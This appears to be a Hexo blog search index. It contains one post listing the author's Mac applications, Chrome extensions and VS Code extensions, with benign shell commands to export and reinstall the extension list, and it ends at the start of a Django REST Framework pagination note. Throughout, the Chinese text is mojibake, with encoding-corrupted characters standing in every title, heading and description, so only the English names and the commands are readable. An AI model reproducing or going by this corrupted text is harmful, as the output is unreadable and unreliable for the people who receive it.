<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>æˆ‘çš„Macè£…æœºè½¯ä»¶æ±‡æ€»</title>
      <link href="/tech/my-mac-apps/"/>
      <url>/tech/my-mac-apps/</url>
      
        <content type="html"><![CDATA[<blockquote class="blockquote-center">            <i class="fa fa-quote-left"></i>            <p>å·¥æ¬²å–„å…¶äº‹ï¼Œå¿…å…ˆåˆ©å…¶å™¨</p>            <i class="fa fa-quote-right"></i>          </blockquote><ol><li>å¸¸ç”¨å¿…å¤‡è½¯ä»¶ï¼ˆChrome/QQç­‰ï¼‰é™¤å¤–</li><li>æˆ‘ä½¿ç”¨çš„æ˜¯Mac OSï¼Œå› æ­¤åˆ—è¡¨ä¸­å°éƒ¨åˆ†è½¯ä»¶å¯èƒ½æ²¡æœ‰windowsç‰ˆæœ¬</li></ol><a id="more"></a><h1 id="åŸºç¡€è½¯ä»¶"><a href="#åŸºç¡€è½¯ä»¶" class="headerlink" title="åŸºç¡€è½¯ä»¶"></a>åŸºç¡€è½¯ä»¶</h1><table><thead><tr><th>Name</th><th>Type</th><th>Desc</th></tr></thead><tbody><tr><td>AppManager</td><td>ç³»ç»Ÿ</td><td>appå¸è½½</td></tr><tr><td>Colossus</td><td>ç³»ç»Ÿ</td><td>CPUã€å†…å­˜ã€ç½‘ç»œæµé‡ç­‰ç›‘æ§</td></tr><tr><td>Dr. Cleaner</td><td>ç³»ç»Ÿ</td><td>åƒåœ¾æ–‡ä»¶æ¸…ç†ã€å†…å­˜ä¼˜åŒ–ã€appå¸è½½ç­‰</td></tr><tr><td>Dr. Unarchiver</td><td>ç³»ç»Ÿ</td><td>è§£å‹ç¼©</td></tr><tr><td>EBMac</td><td>å­¦ä¹ </td><td>EPWINGæ ¼å¼å­—å…¸åŠ è½½</td></tr><tr><td>Find Exchange</td><td>é‡‘è</td><td>æ±‡ç‡æ¢ç®—</td></tr><tr><td>Free Download Manager</td><td>ç³»ç»Ÿ</td><td>ä¸‹è½½å·¥å…·</td></tr><tr><td>F.lux</td><td>ç³»ç»Ÿ</td><td>è‡ªåŠ¨è°ƒèŠ‚å±å¹•è“å…‰ï¼Œä¿æŠ¤çœ¼ç›</td></tr><tr><td>LibreOffice</td><td>åŠå…¬</td><td>åŸºäºOpenOfficeï¼ŒMac OSä¸Šçš„å¼€æºOfficeå…¨å®¶æ¡¶</td></tr><tr><td>Mounty for NTFS</td><td>ç³»ç»Ÿ</td><td>æ”¯æŒåœ¨Mac OSè¯»å–NTFSæ ¼å¼ï¼ˆç§»åŠ¨ï¼‰ç¡¬ç›˜</td></tr><tr><td>MPV</td><td>å¤šåª’ä½“</td><td>æ’­æ”¾è½¯ä»¶é‡Œçš„MVPï¼Œå¼€æº</td></tr><tr><td>OmniDiskSweeper</td><td>ç³»ç»Ÿ</td><td>Macç¡¬ç›˜ä¸çŸ¥ä¸è§‰å¿«æ»¡äº†ï¼Œä¸€èˆ¬æ¸…ç†è½¯ä»¶æ¸…ç†å¹¶æ— æ”¹å–„æ—¶ï¼Œç”¨æ¥æ‰¾å‡ºåˆ°åº•æ˜¯å“ªäº›å¤§æ–‡ä»¶(å¤¹)å ç”¨æ¥ç¡¬ç›˜ç©ºé—´çš„åˆ©å™¨</td></tr><tr><td>PhotoScape X</td><td>å¤šåª’ä½“</td><td>å‚»ç“œåŒ–çš„ç…§ç‰‡å¤„ç†è½¯ä»¶</td></tr><tr><td>Super Player Lite</td><td>å¤šåª’ä½“</td><td>æ’­æ”¾å™¨</td></tr><tr><td>The Unarchiver</td><td>ç³»ç»Ÿ</td><td>è§£å‹ç¼©</td></tr><tr><td>ä¸‡å¹´å†</td><td>ç³»ç»Ÿ</td><td>æ—¥å†ã€å¤©æ°”</td></tr></tbody></table><h1 id="ä¸“ä¸šè½¯ä»¶"><a href="#ä¸“ä¸šè½¯ä»¶" class="headerlink" title="ä¸“ä¸šè½¯ä»¶"></a>ä¸“ä¸šè½¯ä»¶</h1><table><thead><tr><th>Name</th><th>Type</th><th>Desc</th></tr></thead><tbody><tr><td>Anki</td><td>ç”Ÿäº§åŠ›</td><td>å¼€æºè®°å¿†è½¯ä»¶ï¼Œç¥å™¨</td></tr><tr><td>CamScanner</td><td>å¤šåª’ä½“</td><td>å¼ºå¤§çš„OCRè½¯ä»¶</td></tr><tr><td>FreeMind</td><td>ç”Ÿäº§åŠ›</td><td>è„‘å›¾è½¯ä»¶</td></tr><tr><td>GIMP</td><td>å¤šåª’ä½“</td><td>å¼€æºç‰ˆâ€photoshopâ€ï¼Œ<span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMVM0NDExTjdpNw==">æ•™ç¨‹<i class="fa fa-external-link-alt"></i></span></td></tr><tr><td>MarginNote Pro</td><td>ç”Ÿäº§åŠ›</td><td>æ–‡æ¡£æ ‡æ³¨å·¥å…·ï¼Œç ”è¯»å­¦æœ¯è®ºæ–‡ã€ä¹¦ç±çš„ç¥å™¨ï¼Œæ–¹ä¾¿åœ°åˆ¶ä½œMind Mapï¼Œä»¥åŠç”ŸæˆAnkiå¡ç‰‡ç”¨æ¥åå¤è®°å¿†ã€‚å¯æƒœç›®å‰åªæœ‰Mac OSç‰ˆæœ¬</td></tr><tr><td>MacDown</td><td>æ–‡å­—</td><td></td></tr><tr><td>OverSight</td><td>å®‰å…¨</td><td>ç›‘æ§å½“å‰å“ªäº›ç¨‹åºä½¿ç”¨æ‘„åƒå¤´/éº¦å…‹é£</td></tr><tr><td>Simplenote</td><td>æ–‡å­—</td><td>åŸºäºmarkdownçš„äº‘è®°äº‹æœ¬</td></tr><tr><td>Slack</td><td>é€šè®¯</td><td></td></tr><tr><td>TeamViewer</td><td>é€šè®¯</td><td></td></tr><tr><td>Telegram</td><td>é€šè®¯</td><td></td></tr></tbody></table><h1 id="å¼€å‘ç›¸å…³"><a href="#å¼€å‘ç›¸å…³" class="headerlink" title="å¼€å‘ç›¸å…³"></a>å¼€å‘ç›¸å…³</h1><table><thead><tr><th>Name</th><th>Type</th><th>Desc</th></tr></thead><tbody><tr><td>Anaconda</td><td>å¼€å‘</td><td>AIç¼–ç¨‹å…¨å®¶åŒï¼Œpythonå¤šç‰ˆæœ¬ç®¡ç†åˆ©å™¨</td></tr><tr><td>cd to</td><td>ç³»ç»Ÿ</td><td>åœ¨Finderæ–‡ä»¶å¤¹çª—å£ï¼Œæ·»åŠ å›¾æ ‡ï¼Œå¯ä»¥ä¸€é”®æ‰“å¼€å½“å‰ç›®å½•çš„shell</td></tr><tr><td>Dash</td><td>å¼€å‘</td><td></td></tr><tr><td>DB Browser for SQLite</td><td>æ•°æ®åº“</td><td>GUI SQLiteå®¢æˆ·ç«¯</td></tr><tr><td>iHex</td><td>æ–‡æœ¬</td><td>16è¿›åˆ¶ç¼–è¾‘</td></tr><tr><td>MacVim</td><td>æ–‡æœ¬</td><td>æ–‡æœ¬ç¼–è¾‘</td></tr><tr><td>Pencil</td><td>å¼€å‘</td><td>å¼€æºçš„UIåŸå‹è®¾è®¡å·¥å…·</td></tr><tr><td>pgadmin</td><td>å¼€å‘</td><td>åŸºäºwebçš„PostgreSQLå®¢æˆ·ç«¯</td></tr><tr><td>Postman</td><td>å¼€å‘</td><td>HTTPæµ‹è¯•</td></tr><tr><td>PxCook</td><td>è®¾è®¡</td><td>è‡ªåŠ¨æ ‡æ³¨å·¥å…·</td></tr><tr><td>Sequel Pro</td><td>æ•°æ®åº“</td><td>GUI MySQLå®¢æˆ·ç«¯</td></tr><tr><td>Termius</td><td>å¼€å‘</td><td>GUI SSHå®¢æˆ·ç«¯</td></tr><tr><td>Virtual Box</td><td>è™šæ‹Ÿæœº</td><td></td></tr><tr><td>VMware Fusion</td><td>è™šæ‹Ÿæœº</td><td></td></tr></tbody></table><h1 id="Chrome-æ‰©å±•"><a href="#Chrome-æ‰©å±•" class="headerlink" title="Chrome æ‰©å±•"></a>Chrome æ‰©å±•</h1><table><thead><tr><th>Name</th><th>Type</th><th>Desc</th></tr></thead><tbody><tr><td>AdBlock</td><td>ç³»ç»Ÿ</td><td>å¹¿å‘Šæ‹¦æˆª</td></tr><tr><td>ApiDebug Http Test</td><td>å¼€å‘</td><td>Chromeæ’ä»¶ç‰ˆâ€Postmanâ€</td></tr><tr><td>Better History</td><td>ç³»ç»Ÿ</td><td>Chromeçš„å†å²å¢å¼ºæ’ä»¶ï¼Œæœ‰å¼ºå¤§çš„æ£€ç´¢è§„åˆ™</td></tr><tr><td>Black Menu for Google</td><td>ç³»ç»Ÿ</td><td>Googleå…¨å®¶æ¡¶çš„å¿«æ·æ–¹å¼</td></tr><tr><td>Bookmark Sidebar</td><td>ç³»ç»Ÿ</td><td>å¼ºå¤§çš„æ”¶è—å¤¹ç®¡ç†æ’ä»¶ï¼ŒåŸºäºé»˜è®¤çš„æ”¶è—å¤¹ï¼ŒåŠŸèƒ½æ¯”é»˜è®¤çš„ä¸çŸ¥é“é«˜åˆ°ï½</td></tr><tr><td>ChroPath</td><td>å¼€å‘</td><td>å¿«é€Ÿç¡®å®šå…ƒç´ çš„xpathï¼Œæ”¯æŒiframe</td></tr><tr><td>ColorZilla</td><td>å¼€å‘</td><td>è·å–RGBå€¼</td></tr><tr><td>Dark Reader</td><td>å¥åº·</td><td>ç½‘é¡µèƒŒæ™¯è‰²å˜é»‘ï¼Œä¿æŠ¤çœ¼ç›ï¼ˆtabå¤šæ—¶ä¼šå½±å“é¡µé¢æ€§èƒ½ï¼Œå› ä¸ºé»˜è®¤å¥½åƒæ˜¯é€‚ç”¨æ‰€æœ‰tabï¼Ÿï¼‰</td></tr><tr><td>EditThisCookie</td><td>å¼€å‘</td><td>å¼ºå¤§çš„Cookieç¼–è¾‘ç®¡ç†æ’ä»¶</td></tr><tr><td>Fatkun Batch Download Image</td><td>å¤šåª’ä½“</td><td>å¼ºå¤§çš„é¡µé¢å›¾ç‰‡æ‰¹é‡ä¸‹è½½æ’ä»¶</td></tr><tr><td>Free Download Manager</td><td>ç³»ç»Ÿ</td><td>ç³»ç»Ÿçš„Free Download Managerå”¤é†’ç”¨</td></tr><tr><td>Google Docs Offline</td><td>åŠå…¬</td><td>ç¦»çº¿ç¼–è¾‘Google Officeæ–‡æ¡£</td></tr><tr><td>Grammarly for Chrome</td><td>ç”Ÿäº§åŠ›</td><td>å¯¹è¾“å…¥è‹±æ–‡è¿›è¡Œè¯­æ³•æ‹¼å†™æ£€æŸ¥</td></tr><tr><td>Honey</td><td>è´­ç‰©</td><td>æ¬§ç¾å„å¤§ç”µå•†ç½‘ç«™ï¼Œåœ¨ä¸‹å•é¡µé¢è‡ªåŠ¨å¡«å…¥å¯ç”¨çš„ä¼˜æƒ åˆ¸æ‰“æŠ˜ç </td></tr><tr><td>Japanese IO</td><td>ç”Ÿäº§åŠ›</td><td>ç½‘é¡µæ—¥è¯­å•è¯åˆ’è¯æŸ¥è¯¢ï¼ŒåŠ å…¥Japanese IOç”Ÿè¯æœ¬ï¼Œä¹‹ååœ¨å…¶ç½‘ç«™å¯ä»¥è¿›è¡Œå¤ä¹ </td></tr><tr><td>JSON-handle</td><td>å¼€å‘</td><td>æ ¼å¼åŒ–é¡µé¢çš„jsonæ–‡æœ¬</td></tr><tr><td>Kami Extension</td><td>ç”Ÿäº§åŠ›</td><td>å¼ºå¤§çš„æ–‡æ¡£æ ‡æ³¨å·¥å…·ï¼Œç±»ä¼¼äºMarginNote Proï¼Œä½†æ²¡æœ‰è„‘å›¾ã€åˆ¶å¡åŠŸèƒ½</td></tr><tr><td>Lighthouse</td><td>å¼€å‘</td><td>å¯¹ç«™ç‚¹å„ç§æ€§èƒ½æŒ‡æ ‡è¿›è¡Œè¯„ä¼°ï¼Œä»¥ç»™ç½‘ç«™ç®¡ç†äººå‘˜æä¾›å¯¹è¿›è¡Œç½‘ç«™ä¼˜åŒ–çš„æ•°æ®ä¾æ®</td></tr><tr><td>Live editor for CSS, Less &amp; Sass</td><td>å¼€å‘</td><td>ä½¿ç”¨é¡µé¢ç¼–è¾‘å™¨å®æ—¶é¢„è§ˆCSS/Less/Sassä»£ç ã€‚è‡ªåŠ¨å®Œæˆï¼Œæ›´å°‘çš„/Sassåˆ°CSSï¼Œç¾åŒ–ï¼Œç¼©å°ï¼ŒCSSé‡æ–°åŠ è½½ï¼Œlintã€‚ã€‚ã€‚</td></tr><tr><td>Momentum</td><td>ç³»ç»Ÿ</td><td>è®©chromeæ–°æ ‡ç­¾é¡µæ‹¥æœ‰ç¾å›¾ã€æ—¶é—´ã€å¤©æ°”ã€TODOç­‰å¤šåŠŸèƒ½</td></tr><tr><td>Nimbus Screenshot &amp; Screen Video Recorder</td><td>å¤šåª’ä½“</td><td>å¼ºå¤§çš„ç½‘é¡µæˆªå›¾ï¼Œæ”¯æŒå…¨ç½‘é¡µã€æ»šåŠ¨ç­‰å„ç§æˆªå›¾æ¨¡å¼ï¼Œä¹Ÿæ”¯æŒå½•åˆ¶è§†é¢‘</td></tr><tr><td>NooBoss</td><td>ç³»ç»Ÿ</td><td>å¼ºå¤§çš„chromeæ’ä»¶ç®¡ç†å·¥å…·ï¼Œæ¯”é»˜è®¤çš„ä¸çŸ¥é“é«˜åˆ°ï½</td></tr><tr><td>Octotree</td><td>å¼€å‘</td><td>ä¸ºgithubä»“åº“å¢åŠ ä¸“å±çš„ä¾§è¾¹æ ï¼Œä»¥æ–‡ä»¶æ ‘çš„æ¨¡å¼æŸ¥çœ‹ä»“åº“çš„æ–‡ä»¶ã€‚åŒæ—¶æ”¯æŒgithubçš„å¤œé—´æ¨¡å¼</td></tr><tr><td>One-click Image Reader (OCR)</td><td>å¤šåª’ä½“</td><td>æˆªå›¾+OCR</td></tr><tr><td>Online Dictionary Helper</td><td>ç”Ÿäº§åŠ›</td><td>å¼ºå¤§çš„åˆ’è¯è¯å…¸æ¡†æ¶ï¼Œå›½äººçš„ä½œå“ã€‚æ”¯æŒmdxè¯å…¸ã€è‡ªåˆ¶è¯å…¸ï¼Œå†…ç½®å¤šç§è‹±æ–‡è¯å…¸åŠæ³•ã€å¾·ã€ä¿„è¯­ç­‰å¤šç§è¯å…¸ï¼Œå¹¶ä¸”æ”¯æŒä¸€é”®åˆ¶åšAnkiå¡ç‰‡ï¼ˆé€šè¿‡Ankiçš„AnkiConnectæ’ä»¶ï¼‰ï¼Œä»¥ä¾›æ—¥ååå¤å¤ä¹ </td></tr><tr><td>Page Ruler Redux</td><td>å¼€å‘</td><td>æµ‹é‡ç½‘é¡µå…ƒç´ çš„åƒç´ æ•°</td></tr><tr><td>Proxy SwitchyOmega</td><td>ç³»ç»Ÿ</td><td>å¼ºå¤§çš„HTTP/SOCKSä»£ç†å·¥å…·ï¼Œæ”¯æŒé¡µé¢å¿«é€Ÿåˆ‡æ¢ã€‚æ¯”é»˜è®¤çš„ä¸çŸ¥é“é«˜åˆ°ï½</td></tr><tr><td>Quick Javascript Switcher</td><td>ç³»ç»Ÿ/å¼€å‘</td><td>å¿«é€Ÿåˆ‡æ¢é¡µé¢çš„JSç¦ç”¨/å¯ç”¨</td></tr><tr><td>Screencastify</td><td>å¤šåª’ä½“</td><td>å¼ºå¤§çš„å½•å±æ’ä»¶</td></tr><tr><td>Session Buddy</td><td>ç³»ç»Ÿ</td><td>åŒæ—¶æ‰“å¼€éå¸¸å¤šTabæ—¶ï¼Œå¯ä»¥ç”¨å®ƒåˆ†ç±»åˆ†ç»„ç®¡ç†è¿™äº›tagï¼Œæš‚æ—¶ä¸ç”¨çš„ç»„å¯ä»¥æ”¾å¿ƒå…³é—­ï¼Œä¹‹åå¯ä»¥ä¸€é”®é‡å¼€</td></tr><tr><td>Set Character Encoding</td><td>ç³»ç»Ÿ</td><td>ç½‘é¡µç¼–ç è®¾ç½®/åˆ‡æ¢å·¥å…·ï¼Œæ¯”é»˜è®¤çš„æ–¹ä¾¿å¾ˆå¤šğŸ‘“</td></tr><tr><td>Strict Workflow</td><td>ç”Ÿäº§åŠ›/å¥åº·</td><td>ç•ªèŒ„é’Ÿï¼Œå¸¦æœ‰å·¥ä½œå‘¨æœŸå†…ç‰¹å®šç½‘ç«™å±è”½åŠŸèƒ½ï¼Œä»¥é˜²æ­¢ä¸è‡ªåˆ¶åœ°èµ°ç¥</td></tr><tr><td>Talend API Tester - Free Edition</td><td>å¼€å‘</td><td>Postman ç½‘é¡µç‰ˆ 2</td></tr><tr><td>Tampermonkey</td><td>ç³»ç»Ÿ/ç”Ÿäº§åŠ›/å¼€å‘</td><td>å¼ºå¤§çš„è„šæœ¬æ¡†æ¶å’Œå¸‚åœºï¼Œå¯ä»¥ç†è§£ä¸ºåœ¨chromeæ’ä»¶é‡Œå­˜åœ¨çš„æ’ä»¶å¸‚åœºï¼Œæˆ‘å¸¸ç”¨çš„è„šæœ¬æœ‰ï¼š</br>Â·HTML5æ’­æ”¾å™¨å¢å¼ºæ’ä»¶</br>Â·ç™¾åº¦äº‘æ’ä»¶+APIKey</br>Â·ç™¾åº¦ç½‘ç›˜ç›´é“¾ä¸‹è½½åŠ©æ‰‹</br>Â·è§£é™¤Bç«™åŒºåŸŸé™åˆ¶</td></tr><tr><td>The Great Suspender</td><td>ç³»ç»Ÿ</td><td>ä¸­ä½æ€§èƒ½ç”µè„‘çš„ç¦éŸ³ã€‚å½“åŒæ—¶æ‰“å¼€å¤§é‡tabæ—¶ï¼ŒCPUå’Œå†…å­˜ä½¿ç”¨é‡å¾ˆé«˜ï¼Œè€Œé€šå¸¸åœ¨ä½¿ç”¨ä¸­çš„tabåªæ˜¯å…¶ä¸­çš„ä¸€ä¸ªæˆ–å‡ ä¸ªã€‚è¯¥æ’ä»¶å¯ä»¥å°†ä¸€æ®µæ—¶é—´æ²¡æœ‰è¢«ä½¿ç”¨åˆ°çš„tabåœæ­¢ï¼ˆä½†ä¸å…³é—­ï¼‰ä»¥é‡Šæ”¾ç³»ç»Ÿèµ„æºï¼Œéœ€è¦ç”¨åˆ°çš„æ—¶å€™å†å•å‡»é‡æ–°åŠ è½½å³å¯</td></tr><tr><td>Turn Off the Lights</td><td>å¥åº·</td><td>ç½‘é¡µåŠ ç°è‰²æ»¤é•œï¼Œä¿æŠ¤çœ¼ç›</td></tr><tr><td>User-Agent Switcher for Chrome</td><td>å¼€å‘</td><td>å¼ºå¤§çš„User Agentåˆ‡æ¢å·¥å…·</td></tr><tr><td>Video Speed Controller</td><td>å¤šåª’ä½“</td><td>h5è§†é¢‘åŠ å‡é€Ÿæ’­æ”¾(æœ‰äº›è§†é¢‘é»˜è®¤æ²¡æœ‰æä¾›æ”¹é€‰é¡¹)ï¼Œä»¥åŠå¿«è¿›å’Œåé€€</td></tr><tr><td>Wappalyzer</td><td>å¼€å‘</td><td>åˆ†æå½“å‰ç½‘é¡µ(ç«™)æ‰€é€‚ç”¨çš„æŠ€æœ¯æ ˆ</td></tr><tr><td>Web Developer</td><td>å¼€å‘</td><td>ä¸ºwebå¼€å‘äººå‘˜å®ç”¨å·¥å…·é›†</td></tr><tr><td>Window Resizer</td><td>å¼€å‘</td><td>æµè§ˆå™¨çª—å£å¤§å°è®¾ç½®å·¥å…·</td></tr><tr><td>Yomichan</td><td>ç”Ÿäº§åŠ›</td><td>æ—¥è¯­ç‰ˆçš„Online Dictionary Helperï¼Œå¯¹é¡µé¢æ—¥è¯­åˆ’è¯å¾—åˆ°æŸ¥è¯¢å•è¯çš„è‹±è¯­è§£é‡Šå’ŒéŸ³é¢‘å‘éŸ³ï¼ŒåŒæ ·æ”¯æŒè‡ªåˆ¶è¯å…¸ã€‚å…¶ä½œè€…ä¹Ÿæ˜¯AnkiConnectçš„ä½œè€…ï¼Œç¬¬ä¸€ä½å®ç°ç½‘é¡µåˆ’è¯æŸ¥è¯¢å¹¶ä¸Ankiè”åŠ¨ä¸€é”®åˆ¶å¡çš„å¤§ç¥ã€‚å…¶å®ODHä½œè€…ä¹Ÿæ˜¯å‚è€ƒäº†è¯¥æ’ä»¶åˆ¶ä½œçš„ODH</td></tr><tr><td>å”§å”§Chromeæ‰©å±•ç¨‹åº</td><td>å¤šåª’ä½“</td><td>è¿™æ˜¯ä¸€ä¸ªåŸºäºweb,ç”¨äºä¸‹è½½bilibiliè§†é¢‘çš„åœ¨çº¿åº”ç”¨ç¨‹åº,å®ƒèƒ½å¤Ÿä¸‹è½½99%bilibiliå®˜æ–¹è§†é¢‘(å¥‡è‰º\ä¹è§†TVé‚£äº›éå®˜æ–¹æ’­æ”¾å™¨é™¤å¤–),å¹¶ä¸”å®ƒå°†ä¼šç»ˆèº«å…è´¹æä¾›ä½¿ç”¨,å¦å¤–,ç°åœ¨å®ƒå·²ç»æ”¯æŒå¼¹å¹•ä¸‹è½½!</td></tr><tr><td>çŒ«æŠ“</td><td>å¤šåª’ä½“</td><td>ç½‘é¡µå¤šåª’ä½“èµ„æºURLå—…æ¢å·¥å…·</td></tr></tbody></table><h1 id="Visual-Studio-Code-æ’ä»¶"><a href="#Visual-Studio-Code-æ’ä»¶" class="headerlink" title="Visual Studio Code æ’ä»¶"></a>Visual Studio Code æ’ä»¶</h1><h2 id="æ’ä»¶åˆ—è¡¨å¯¼å‡º"><a href="#æ’ä»¶åˆ—è¡¨å¯¼å‡º" class="headerlink" title="æ’ä»¶åˆ—è¡¨å¯¼å‡º"></a>æ’ä»¶åˆ—è¡¨å¯¼å‡º</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code --list-extensions | sed -e <span class="string">'s/^/code --install-extension /'</span> &gt; my_vscode_extensions.sh</span><br></pre></td></tr></table></figure><h2 id="æˆ‘çš„æ’ä»¶åˆ—è¡¨"><a href="#æˆ‘çš„æ’ä»¶åˆ—è¡¨" class="headerlink" title="æˆ‘çš„æ’ä»¶åˆ—è¡¨"></a>æˆ‘çš„æ’ä»¶åˆ—è¡¨</h2><p><code>my_vscode_extensions.sh</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">code --install-extension IBM.output-colorizer</span><br><span class="line">code --install-extension alefragnani.project-manager</span><br><span class="line">code --install-extension Angular.ng-template</span><br><span class="line">code --install-extension bajdzis.vscode-database</span><br><span class="line">code --install-extension christian-kohler.npm-intellisense</span><br><span class="line">code --install-extension christian-kohler.path-intellisense</span><br><span class="line">code --install-extension clinyong.vscode-css-modules</span><br><span class="line">code --install-extension cyrilletuzi.angular-schematics</span><br><span class="line">code --install-extension dakara.transformer</span><br><span class="line">code --install-extension DavidAnson.vscode-markdownlint</span><br><span class="line">code --install-extension dbaeumer.jshint</span><br><span class="line">code --install-extension dbaeumer.vscode-eslint</span><br><span class="line">code --install-extension donjayamanne.githistory</span><br><span class="line">code --install-extension donjayamanne.jquerysnippets</span><br><span class="line">code --install-extension EditorConfig.EditorConfig</span><br><span class="line">code --install-extension eg2.vscode-npm-script</span><br><span class="line">code --install-extension esbenp.prettier-vscode</span><br><span class="line">code --install-extension fantasy.vscode-hexo-utils</span><br><span class="line">code --install-extension geyao.html-snippets</span><br><span class="line">code --install-extension GrapeCity.gc-excelviewer</span><br><span class="line">code --install-extension HookyQR.beautify</span><br><span class="line">code --install-extension jasonnutter.search-node-modules</span><br><span class="line">code --install-extension JeffersonQin.hexo-next-snippets</span><br><span class="line">code --install-extension johnpapa.angular-essentials</span><br><span class="line">code --install-extension johnpapa.Angular2</span><br><span class="line">code --install-extension johnpapa.vscode-peacock</span><br><span class="line">code --install-extension KevinRose.vsc-python-indent</span><br><span class="line">code --install-extension leizongmin.node-module-intellisense</span><br><span class="line">code --install-extension ms-azuretools.vscode-docker</span><br><span class="line">code --install-extension ms-python.python</span><br><span class="line">code --install-extension ms-vscode.cpptools</span><br><span class="line">code --install-extension ms-vscode.powershell</span><br><span class="line">code --install-extension ms-vscode.vscode-typescript-next</span><br><span class="line">code --install-extension msjsdiag.debugger-for-chrome</span><br><span class="line">code --install-extension mtxr.sqltools</span><br><span class="line">code --install-extension mushan.vscode-paste-image</span><br><span class="line">code --install-extension nickdodd79.gulptasks</span><br><span class="line">code --install-extension nrwl.angular-console</span><br><span class="line">code --install-extension PKief.material-icon-theme</span><br><span class="line">code --install-extension pranaygp.vscode-css-peek</span><br><span class="line">code --install-extension redhat.java</span><br><span class="line">code --install-extension shamanu4.django-intellisense</span><br><span class="line">code --install-extension shd101wyy.markdown-preview-enhanced</span><br><span class="line">code --install-extension sidthesloth.html5-boilerplate</span><br><span class="line">code --install-extension sysoev.language-stylus</span><br><span class="line">code --install-extension tanato.vscode-gulp</span><br><span class="line">code --install-extension thebarkman.vscode-djaneiro</span><br><span class="line">code --install-extension thekalinga.bootstrap4-vscode</span><br><span class="line">code --install-extension VisualStudioExptTeam.vscodeintellicode</span><br><span class="line">code --install-extension vscjava.vscode-java-debug</span><br><span class="line">code --install-extension vscjava.vscode-java-dependency</span><br><span class="line">code --install-extension vscjava.vscode-java-pack</span><br><span class="line">code --install-extension vscjava.vscode-java-test</span><br><span class="line">code --install-extension vscjava.vscode-maven</span><br><span class="line">code --install-extension vscode-icons-team.vscode-icons</span><br><span class="line">code --install-extension waderyan.nodejs-extension-pack</span><br><span class="line">code --install-extension xabikos.JavaScriptSnippets</span><br><span class="line">code --install-extension yzhang.markdown-all-in-one</span><br><span class="line">code --install-extension ZainChen.json</span><br><span class="line">code --install-extension zhuangtongfa.material-theme</span><br><span class="line">code --install-extension zhutian.swig</span><br></pre></td></tr></table></figure><h2 id="æ’ä»¶åˆ—è¡¨å¯¼å…¥"><a href="#æ’ä»¶åˆ—è¡¨å¯¼å…¥" class="headerlink" title="æ’ä»¶åˆ—è¡¨å¯¼å…¥"></a>æ’ä»¶åˆ—è¡¨å¯¼å…¥</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash my_vscode_extensions.sh</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
            <tag> Mac OS </tag>
            
            <tag> Setup </tag>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django REST Framework å­¦ä¹ ç¬”è®°ï¼ˆåäº”ï¼‰ï¼šåˆ†é¡µç»„ä»¶</title>
      <link href="/tech/drf-learning-notes-15-pagination/"/>
      <url>/tech/drf-learning-notes-15-pagination/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Django REST Framework Learning Notes (15): Pagination</strong></em></li><li>Author: dog2</li></ul><hr><h1 id="åŸºæœ¬ä¿¡æ¯"><a href="#åŸºæœ¬ä¿¡æ¯" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h1><ul><li>æºç  <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvcGFnaW5hdGlvbi5weQ==">rest_framework.pagination<i class="fa fa-external-link-alt"></i></span></li><li>å®˜æ–¹æ–‡æ¡£ <span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcGFnaW5hdGlvbi8=">API Guild - Pagination<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzE1X2RyZl9wYWdpbmF0aW9uLw==">æœ¬æ–‡demoä»£ç Github<i class="fa fa-external-link-alt"></i></span></li></ul><a id="more"></a><h1 id="DRFåˆ†é¡µç±»"><a href="#DRFåˆ†é¡µç±»" class="headerlink" title="DRFåˆ†é¡µç±»"></a>DRFåˆ†é¡µç±»</h1><h2 id="åŸºç¡€åˆ†é¡µç±»-PageNumberPagination"><a href="#åŸºç¡€åˆ†é¡µç±»-PageNumberPagination" class="headerlink" title="åŸºç¡€åˆ†é¡µç±» PageNumberPagination"></a>åŸºç¡€åˆ†é¡µç±» PageNumberPagination</h2><h3 id="urls-py"><a href="#urls-py" class="headerlink" title="urls.py"></a>urls.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span 